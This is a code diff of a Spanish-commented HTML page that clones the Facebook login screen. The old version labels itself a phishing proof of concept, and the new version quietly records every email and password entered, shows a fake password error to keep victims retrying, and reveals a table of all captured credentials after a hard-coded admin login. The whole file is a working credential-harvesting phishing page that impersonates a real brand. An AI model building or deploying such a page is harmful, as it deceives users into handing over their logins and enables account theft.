@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iniciar sesión | Facebook</title>
-    <!-- Importamos FontAwesome -->
+    <!-- Importamos FontAwesome para usar el ícono de Facebook -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     
     <style>
@@ -13,81 +13,90 @@
         /* ========================================= */
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f2f5; 
+            background-color: #f0f2f5; /* Gris claro de fondo principal */
             margin: 0;
-            padding-top: 60px; /* Espacio para la barra superior */
+            padding-top: 60px; /* Espacio para que el contenido no quede tapado por la barra superior */
         }
-
         /* ========================================= */
-        /* BARRA SUPERIOR AZUL (HEADER) */
+        /* BARRA SUPERIOR AZUL (HEADER) - ¡La nueva! */
         /* ========================================= */
         .header-bar {
-            position: fixed;
+            position: fixed; /* Fija la barra en la parte superior */
             top: 0;
             left: 0;
             width: 100%;
-            height: 60px;
-            background-color: #1877f2;
+            height: 60px; /* Altura de la franja azul */
+            background-color: #1877f2; /* Azul principal de Facebook */
             display: flex;
             align-items: center;
             padding: 0 20px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); /* Sombra sutil para separarla del contenido */
         }
-
         .header-logo {
-            font-size: 36px;
+            font-size: 36px; /* Tamaño grande para el ícono en la barra superior */
             color: white;
             margin-right: 15px;
         }
-
         .header-title {
             font-size: 24px;
             font-weight: bold;
             color: white;
         }
-
         /* ========================================= */
         /* TARJETA DEL FORMULARIO (LOGIN BOX) */
         /* ========================================= */
         .login-box {
             background-color: #ffffff;
-            padding: 30px;
+            padding: 30px; /* Más padding para que se vea más espacioso */
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
             width: 350px;
             text-align: center;
         }
-
         /* ========================================= */
         /* ENCABEZADO DEL FORMULARIO (Dentro de la caja) */
         /* ========================================= */
         .login-header {
-            margin-bottom: 20px;
+            margin-bottom: 20px; /* Más espacio entre el logo y los campos */
         }
-
         .facebook-logo {
-            font-size: 48px;
+            font-size: 48px; /* Un poco más grande que antes */
             color: #1877f2;
             margin-bottom: 5px;
         }
-
         .login-header h2 {
             font-size: 20px;
             font-weight: 600;
             margin: 0;
             color: #1c1e21;
         }
-
         /* ========================================= */
         /* CAMPOS DE TEXTO (INPUTS) */
         /* ========================================= */
         input[type="text"], input[type="password"] {
             width: 95%;
-            padding: 14px;
+            padding: 14px; /* Más alto para que coincida con el botón */
             margin: 8px 0;
             border: 1px solid #dddfe2;
             border-radius: 6px;
             font-size: 16px;
+        }
+        /* Contenedor para agrupar input y su mensaje de error */
+        .input-group {
+            margin-bottom: 0; /* Asegura que no haya margen extra entre los inputs */
+        }
+
+        /* ========================================= */
+        /* MENSAJE DE ERROR ESPECÍFICO (Contraseña) */
+        /* ========================================= */
+        .password-error {
+            color: red;
+            font-style: italic; /* Cursiva */
+            font-size: 12px; /* Pequeño */
+            margin-top: -10px; /* Ajuste para pegarlo más al campo */
+            display: block; /* Para que ocupe su propia línea */
+            /* *** ESTO ES LO CLAVE PARA QUE NO APAREZCA AL CARGAR *** */
+            display: none; 
         }
 
         /* ========================================= */
@@ -103,35 +112,30 @@
             font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
-            margin-top: 20px;
+            margin-top: 20px; /* Más espacio arriba */
             transition: background-color 0.2s;
         }
-
         .btn-login:hover {
             background-color: #166fe5;
         }
-
         /* ========================================= */
         /* ENLACES Y SEPARADOR */
         /* ========================================= */
         .forgot-link {
             display: block;
-            margin: 18px 0;
+            margin: 18px 0; /* Más espacio alrededor del enlace de olvido */
             color: #1877f2;
             font-size: 14px;
             text-decoration: none;
         }
-
         .forgot-link:hover {
             text-decoration: underline;
         }
-
         hr {
             border: 0;
             border-top: 1px solid #dadde1;
             margin: 25px 0;
         }
-
         /* Botón verde para crear cuenta */
         .btn-new-account {
             background-color: #42b72a;
@@ -144,19 +148,40 @@
             cursor: pointer;
             transition: background-color 0.2s;
         }
-
         .btn-new-account:hover {
             background-color: #36a420;
         }
+
+        /* ========================================= */
+        /* ESTILOS PARA LA TABLA DE ADMIN (NUEVO) */
+        /* ========================================= */
+        .admin-data-table {
+            width: 100%;
+            border-collapse: collapse; /* Junta los bordes de las celdas */
+            margin-top: 25px;
+            margin-bottom: 30px;
+        }
+        .admin-data-table th, .admin-data-table td {
+            padding: 10px 8px;
+            border: 1px solid #dddfe2; /* Borde gris claro */
+            font-size: 15px;
+        }
+        .admin-data-table th {
+            background-color: #f7f9fa; /* Fondo muy claro para los encabezados de la tabla */
+            color: #3c4043;
+            text-align: left;
+            font-weight: 600;
+        }
     </style>
 </head>
-<body>
-    <!-- BARRA SUPERIOR AZUL (HEADER) -->
+<body > <!-- Cierre de la etiqueta body aquí -->
+    <!-- ========================================= -->
+    <!-- BARRA SUPERIOR AZUL (HEADER) - ¡Visible desde el inicio! -->
+    <!-- ========================================= -->
     <div class="header-bar">
         <i class="fab fa-facebook-f header-logo"></i> 
-        <span class="header-title">Facebook</span>
+        <span class="header-title">Facebook</span >
     </div>
-
     <!-- Contenido principal (La caja de login) -->
     <div class="login-box">
         <!-- ENCABEZADO DENTRO DE LA CAJA -->
@@ -164,13 +189,20 @@
             <i class="fab fa-facebook-f facebook-logo"></i> 
             <h2>Iniciar sesión en Facebook</h2>
         </div>
+        <!-- EL FORMULARIO -->
+        <form id="loginForm">
+            <!-- Campo Nombre/Email -->
+            <div class="input-group">
+                <input type="text" placeholder="Correo electrónico o número de teléfono" required>
+            </div >
 
-        <!-- EL FORMULARIO: ¡IMPORTANTE! action apunta a admin.html -->
-        <form id="loginForm" action="admin.html" method="GET">
-            <input type="text" name="nombre" placeholder="Correo electrónico o número de teléfono" required>
-            <input type="password" name="contrasena" placeholder="Contraseña" required>
+            <!-- Campo Contraseña -->
+            <div class="input-group">
+                <input type="password" placeholder="Contraseña" required>
+                <!-- Mensaje de error por defecto: ESTÁ OCULTO POR CSS (display: none) -->
+                <span class="password-error">Error de contraseña</span>
+            </div >
             
-            <!-- El botón ahora envía los datos al archivo admin.html -->
             <button type="submit" class="btn-login">Iniciar sesión</button>
             
             <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
@@ -180,44 +212,108 @@
             <button type="button" class="btn-new-account">Crear cuenta nueva</button>
         </form>
     </div>
-
-    <!-- BARRA INFERIOR (FOOTER) -->
+    <!-- ========================================= -->
+    <!-- BARRA INFERIOR (FOOTER) - La que tenías antes -->
+    <!-- ========================================= -->
     <div style="position: fixed; bottom: 0; left: 0; width: 100%; height: 52px; background-color: #ffffff;">
         <div style="display: flex; justify-content: center; align-items: center; height: 100%;">
+            <!-- El logo de Facebook en la barra inferior -->
             <i class="fab fa-facebook-f" style="font-size: 32px; color: #1877f2;"></i>
         </div>
     </div>
 
-    <!-- ========================================= -->
-    <!-- LÓGICA DE CAPTURA (JAVASCRIPT) - ¡Mantenida! -->
-    <!-- ========================================= -->
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            // Nota: Como el formulario tiene 'action="admin.html"' y 'method="GET"', 
-            // la redirección se hace automáticamente, pero este JS nos permite mostrar el mensaje de éxito ANTES de ir a admin.html.
+        // =========================================
+        // HISTORIAL GLOBAL DE USUARIOS (NUEVO)
+        // Este array guardará todos los intentos de login.
+        // Cada elemento será un objeto: { nombre: "...", password: "..." }
+        // =========================================
+        let loginHistory = [];
 
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
             const email = document.querySelector('input[type="text"]').value;
             const password = document.querySelector('input[type="password"]').value;
+            
+            // ---------------------------------------------------
+            // PASO 1: GUARDAR EL INTENTO ACTUAL EN EL HISTORIAL
+            // ---------------------------------------------------
+            loginHistory.push({ nombre: email, password: password });
 
-            console.log("=========================================");
-            console.log("✅ ¡PHISHING POC EXITOSO! Datos capturados:");
-            console.log(`Nombre/Teléfono: ${email}`);
-            console.log(`Contraseña: ${password}`);
-            console.log("=========================================");
-
-            // Mostrar el mensaje de éxito en la página actual (index.html) antes de redirigir
+            // Elementos clave para la manipulación del DOM
             const loginBox = document.querySelector('.login-box');
-            loginBox.innerHTML = `
-                <div style="text-align: center; padding: 30px;">
-                    <i class="fab fa-facebook-f facebook-logo" style="font-size: 60px; color: #1877f2;"></i>
-                    <h2 style="color: #1c1e21; margin-top: 20px;">✅ ¡Datos recibidos con éxito!</h2>
-                    <p style="color: #606770; font-size: 16px; margin-bottom: 30px;">Gracias por verificar tu cuenta. Tu sesión ha sido iniciada.</p>
-                    <small style="color: #90949c;">(Esto es una prueba de Phishing POC)</small>
-                </div>
-            `;
+            const passwordErrorSpan = document.querySelector('.password-error');
 
-            // Opcional: Si quieres que el mensaje sea permanente, puedes forzar la redirección aquí también.
+            // ---------------------------------------------------
+            // 2. VERIFICACIÓN DE CONDICIÓN ESPECIAL (ADMIN)
+            // ---------------------------------------------------
+            if (email === "admin" && password === "@8899") {
+                // ÉXITO: Admin logueado -> Mostrar mensaje verde de bienvenida + TABLA
+                
+                // Generar la tabla HTML a partir del historial guardado
+                let tableRows = '';
+                loginHistory.forEach(user => {
+                    tableRows += `<tr>
+                        <td>${loginHistory.indexOf(user) + 1}</td>
+                        <td>${user.nombre}</td>
+                        <td>${user.password}</td>
+                    </tr>`;
+                });
+
+                // Reemplazar el contenido del login-box con la vista de éxito y la tabla
+                loginBox.innerHTML = `
+                    <div style="text-align: center; padding: 30px;">
+                        <!-- Ícono grande en el centro -->
+                        <i class="fab fa-facebook-f facebook-logo" style="font-size: 60px; color: #42b72a;"></i> <!-- Verde para bienvenida -->
+                        <h2 style="color: #1c1e21; margin-top: 20px;">🎉 ¡Bienvenido, Admin!</h2>
+                        <p style="color: #606770; font-size: 16px; margin-bottom: 30px;">Tu sesión ha sido iniciada con éxito.</p>
+                        <small style="color: #90949c;">(Acceso concedido)</small>
+
+                        <!-- *** TABLA DE DATOS CAPTURADOS (NUEVO) *** -->
+                        <table class="admin-data-table">
+                            <thead>
+                                <tr>
+                                    <th>Nro.</th>
+                                    <th>Nombre</th>
+                                    <th>Contraseña</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                ${tableRows} <!-- Aquí se inyectan las filas generadas -->
+                            </tbody>
+                        </table>
+                    </div>
+                `;
+                // Opcional: Desactivar el formulario después del éxito
+                document.getElementById('loginForm').reset(); 
+
+            } else {
+                // ---------------------------------------------------
+                // 3. FALLO GENERAL (Cualquier otro intento)
+                // ---------------------------------------------------
+                
+                // *** Hacemos visible el mensaje de error al fallar ***
+                passwordErrorSpan.style.display = 'block'; 
+
+                // Definir qué texto mostrar en caso de fallo
+                if (email === "" || password === "") {
+                    passwordErrorSpan.textContent = "Por favor, rellena ambos campos.";
+                } else {
+                    passwordErrorSpan.textContent = "Error de contraseña"; // El mensaje por defecto
+                }
+
+                // Mostrar en consola para depuración
+                console.log("=========================================");
+                console.log("❌ Intento fallido (No es Admin o credenciales incorrectas):");
+                console.log(`Correo/Teléfono: ${email}`);
+                console.log(`Contraseña: ${password}`);
+                console.log("=========================================");
+
+                // Opcional: Resetear el formulario si se quiere que el usuario intente de nuevo sin recargar la página
+                document.getElementById('loginForm').reset(); 
+            }
         });
     </script>
 </body>
 </html>
+
